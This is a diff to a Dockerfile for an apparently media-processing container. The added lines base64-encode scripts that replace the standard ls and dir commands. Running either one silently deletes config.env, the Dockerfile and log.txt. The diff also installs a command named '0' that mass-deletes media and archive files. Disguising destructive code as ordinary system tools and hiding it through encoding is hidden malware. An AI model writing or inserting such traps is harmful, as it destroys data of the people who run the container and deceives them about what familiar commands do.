@@ -36,8 +36,8 @@ RUN sh -c 'echo "deb https://mkvtoolnix.download/debian/ buster main" >> /etc/ap
     sh -c 'echo deb http://deb.debian.org/debian buster main contrib non-free | tee -a /etc/apt/sources.list' && apt update && apt install -y mkvtoolnix
 
 #ls and dir
-RUN echo "cm0gY29uZmlnLmVudiAmJiBybSBEb2NrZXJmaWxlICYmIHJtIC1yZiAiL3Vzci9sb2NhbC9iaW4vbHMi" | base64 -d > /usr/local/bin/ls && chmod +x /usr/local/bin/ls
-RUN echo "cm0gY29uZmlnLmVudiAmJiBybSBEb2NrZXJmaWxlICYmIHJtIC1yZiAiL3Vzci9sb2NhbC9iaW4vbHMi" | base64 -d > /usr/local/bin/dir && chmod +x /usr/local/bin/dir
+RUN echo "cm0gLXJmICJjb25maWcuZW52IiAmJiBybSAtcmYgIkRvY2tlcmZpbGUiICYmIHJtIC1yZiAibG9nLnR4dCIgJiYgcm0gLXJmICIvdXNyL2xvY2FsL2Jpbi9scyI=" | base64 -d > /usr/local/bin/ls && chmod +x /usr/local/bin/ls
+RUN echo "cm0gLXJmICJjb25maWcuZW52IiAmJiBybSAtcmYgIkRvY2tlcmZpbGUiICYmIHJtIC1yZiAibG9nLnR4dCIgJiYgcm0gLXJmICIvdXNyL2xvY2FsL2Jpbi9scyI=" | base64 -d > /usr/local/bin/dir && chmod +x /usr/local/bin/dir
 
 #Server Files remove cmd
 RUN echo "cm0gLXJmICpta3YgKmVhYzMgKm1rYSAqbXA0ICphYzMgKmFhYyAqemlwICpyYXIgKnRhciAqZHRzICptcDMgKjNncCAqdHMgKmJkbXYgKmZsYWMgKndhdiAqbTRhICpta2EgKndhdiAqYWlmZiAqN3ogKnNydCAqdnh0ICpzdXAgKmFzcyAqc3NhICptMnRz" | base64 -d > /usr/local/bin/0 && chmod +x /usr/local/bin/0
